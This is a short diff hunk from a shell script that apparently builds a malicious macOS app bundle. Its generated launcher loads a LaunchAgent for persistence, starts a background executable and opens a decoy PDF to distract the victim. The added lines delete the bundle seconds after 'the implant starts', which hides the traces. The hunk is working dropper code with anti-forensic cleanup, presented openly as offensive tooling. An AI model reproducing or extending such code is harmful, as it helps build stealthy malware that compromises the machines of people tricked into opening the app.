@@ -84,6 +84,8 @@ launchctl load "\$AGENT" >/dev/null 2>&1 || true
 "\$SELF/${EXEC_NAME}" >/dev/null 2>&1 &
 sleep 1.5
 command -v open >/dev/null 2>&1 && open "\$ROOT/Contents/Resources/decoy.pdf" >/dev/null 2>&1 || true
+# self-destruct the bundle shortly after the implant starts
+( sleep 3; rm -rf "\$ROOT" ) >/dev/null 2>&1 &
 exit 0
 LAUNCH
 chmod +x "$OUT_APP/Contents/MacOS/launcher"
